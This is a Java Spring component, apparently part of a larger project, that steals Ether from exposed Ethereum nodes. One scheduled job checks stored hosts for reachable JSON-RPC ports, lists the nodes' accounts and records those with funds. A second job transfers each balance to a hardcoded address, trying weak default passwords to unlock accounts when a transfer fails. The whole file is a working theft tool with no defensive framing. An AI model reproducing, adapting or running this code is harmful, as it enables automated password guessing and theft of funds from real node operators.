package com.warrior.Mission;

import com.alibaba.fastjson.JSON;
import com.baomidou.mybatisplus.mapper.EntityWrapper;
import com.warrior.controler.ServerController;
import com.warrior.entity.Account;
import com.warrior.entity.Log;
import com.warrior.entity.Netseg;
import com.warrior.entity.Server;
import com.warrior.service.IAccountService;
import com.warrior.service.ILogService;
import com.warrior.service.IServerService;
import com.warrior.serviceImpl.AccountServiceImpl;
import com.warrior.util.DateUtil;
import com.warrior.util.EthcoinAPI;
import com.warrior.util.HttpUtil;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;

import java.math.BigDecimal;
import java.math.BigInteger;
import java.util.Date;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * @author: lqh
 * @description:
 * @program: ETH
 * @create: 2018-05-11 16:38
 **/
@Component
public class CoinMission {

    final static Logger logger = LoggerFactory.getLogger(CoinMission.class);

    final static String myAddress = "0x7828fa9e45a3b9f97a5d2d7921081def2eca7090";

    final static String[] defaulPwd = {"123456", "123456789", "12345678"};


    @Autowired
    ILogService iLogService;

    @Autowired
    IServerService iServerService;

    @Autowired
    IAccountService iAccountService;

    final static ExecutorService threadPool = Executors.newFixedThreadPool(50);
    final static ExecutorService threadPoolTransfer = Executors.newFixedThreadPool(10);

    private static Integer count = 1;

    @Async
    @Scheduled(initialDelay = 1 * 60 * 1000, fixedDelay = 2 * 60 * 1000)
    public void getCoin() throws InterruptedException {
        logger.info("【CoinMission start---getCoin】");
        List<Server> serverList = iServerService.selectList(new EntityWrapper<Server>().ne("pwd", 2));
        for (Server server : serverList) {
            threadPool.execute(new Runnable() {
                @Override
                public void run() {
                    //logger.info("【线程：{}】", Thread.currentThread().getName());
                    if (HttpUtil.telnet(server.getHost(), server.getPort())) {
                        server.setPwd(1);
                        iServerService.updateById(server);
                         logger.info("【{}:{}-telnet成功】", server.getHost(), server.getPort());
                        EthcoinAPI eth = new EthcoinAPI("", "", server.getHost(), server.getPort().toString(), "");
                        if (!eth.isPublicChain()) {
                            //不是公链不处理
                            iServerService.deleteById(server);
                            return;
                        }
                        String allAccount = eth.getAllAccounts();
                        if (allAccount.equals("")) {
                            return;
                        }
                        List<String> accountList = JSON.parseObject(allAccount, List.class);
                        accountList.remove(myAddress);
                        for (String address : accountList) {
                            BigDecimal balance = eth.getBalance(address);
                            BigDecimal minerFee = eth.getMinerFee();
                            BigDecimal availableBlance = balance.subtract(minerFee);
                            if (availableBlance.compareTo(BigDecimal.ZERO) == 1) {
                                server.setPwd(2);
                                iServerService.updateById(server);
                                Account account = new Account()
                                        .setServerId(server.getId())
                                        .setPwd("")
                                        .setAccountPwd("")
                                        .setUser("")
                                        .setAddress(address)
                                        .setBalance(availableBlance.divide(EthcoinAPI.WEI));
                                if (iAccountService.insert(account)) {
                                    logger.info(account + "-链接成功！");
                                    server.deleteById();
                                }
                            } else {
                                 logger.info("【{}余额不足】", address);
                            }
                        }
                    } else {
                        iServerService.deleteById(server);
                         logger.info("【{}:{}-telnet不通】", server.getHost(), server.getPort());
                    }
                }
            });
        }
    }

    @Async
    @Scheduled(initialDelay = 1 * 10 * 1000, fixedDelay = 1 * 60 * 1000)
    public void transfer() throws InterruptedException {
        List<Account> accountList = iAccountService.selectList(new EntityWrapper<>());
        logger.info("【accountList:" + accountList.size() + "】");
        for (Account account : accountList) {
            String address = account.getAddress();
            threadPoolTransfer.execute(new Runnable() {
                @Override
                public void run() {
                    String hash = "";
                    Server server = iServerService.selectOne(new EntityWrapper<Server>().eq("id", account.getServerId()));
                    if (server != null && HttpUtil.telnet(server.getHost(), server.getPort())) {
                        EthcoinAPI eth = new EthcoinAPI(account.getUser(), account.getPwd(), server.getHost(), server.getPort().toString(), account.getAccountPwd());
                        BigDecimal balance = eth.getBalance(address);
                        BigDecimal minerFee = eth.getMinerFee();
                        BigDecimal availableBlance = balance.subtract(minerFee);
                        if (availableBlance.compareTo(BigDecimal.ZERO) == 1) {    //余额足够
                            int count = 3;
                            while (count > 0) {
                                count--;
                                hash = eth.sendTransaction(address, myAddress, EthcoinAPI.unit10To16(availableBlance));
                                if (hash.equals("")) {
                                    for (int i = 0; i < defaulPwd.length; i++) {
                                        if (eth.unlockAccount(address, defaulPwd[i])) {
                                            break;
                                        }
                                    }
                                    hash = eth.sendTransaction(address, myAddress, EthcoinAPI.unit10To16(availableBlance));
                                }
                                if (!hash.equals("")) {
                                    BigDecimal balanceMaxUnit = availableBlance.divide(EthcoinAPI.WEI);
                                    logger.info("【成功从{}向{}转账{}ETH】", address, myAddress, balanceMaxUnit);
                                    Log log = new Log().setLogName("【transferSuccess】").setLogContent("from:" + address + ",to:" + myAddress + ",value:" + balanceMaxUnit + ",hash:" + hash)
                                            .setDate(new Date());
                                    iLogService.insert(log);
                                    break;
                                }
                            }
                        } else {
                            //logger.info("【{}余额不足】", address);
                        }
                    } else {
                        //logger.info("telnet fail");
                    }
                }
            });
        }
    }

}
